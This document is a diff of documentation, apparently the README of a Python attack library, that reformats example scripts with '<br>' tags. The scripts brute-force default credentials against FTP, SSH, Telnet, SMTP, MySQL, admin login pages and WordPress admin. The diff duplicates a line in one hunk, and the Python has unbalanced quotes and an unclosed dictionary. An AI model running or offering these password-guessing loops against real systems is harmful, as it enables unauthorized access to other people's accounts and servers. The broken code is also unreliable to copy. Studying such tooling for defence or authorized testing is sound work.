@@ -277,14 +277,14 @@ we can access and enumerate some or all internal admin panel pages using this me
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.ftp("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.ftp("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 <br><h3>SSH:</h3>
@@ -295,28 +295,29 @@ we can access and enumerate some or all internal admin panel pages using this me
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.ssh1("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.ssh1("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 <br><h4>ssh2:</h4>(using paramiko module) 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.ssh2("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.ssh2("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 <br><h3>TELNET:</h3>
@@ -327,68 +328,68 @@ we can access and enumerate some or all internal admin panel pages using this me
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.telnet1("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.telnet1("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 <br><h4>telnet2:</h4>(using telnetlib module) 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.telnet2("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.telnet2("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 <br><h3>SMTP:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.smtp("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.smtp("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 <br><h3>MYSQL:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.mysql("example.com",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.mysql("example.com",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 <br><h3>ADMIN LOGIN:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.adminlogin("http://example.com/admin/login.php",{'username':user,'password':pwd)==1:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.adminlogin("http://example.com/admin/login.php",{'username':user,'password':pwd)==1:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 
@@ -397,14 +398,14 @@ we can access and enumerate some or all internal admin panel pages using this me
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
 >>>for x in wordlist:
-... user=x.split(":")[0]
-... pwd=x.split(":")[1]
-... print'"[*]Trying:",user,pwd
-... if bane.wpadmin("http://example.com/",username=user,password=pwd)==True:
-...  print'[+]Found'
-...  break
-... else:
-...  print'[-]Failed'
+<br>... user=x.split(":")[0]
+<br>... pwd=x.split(":")[1]
+<br>... print'"[*]Trying:",user,pwd
+<br>... if bane.wpadmin("http://example.com/",username=user,password=pwd)==True:
+<br>...  print'[+]Found'
+<br>...  break
+<br>... else:
+<br>...  print'[-]Failed'
 
 
 
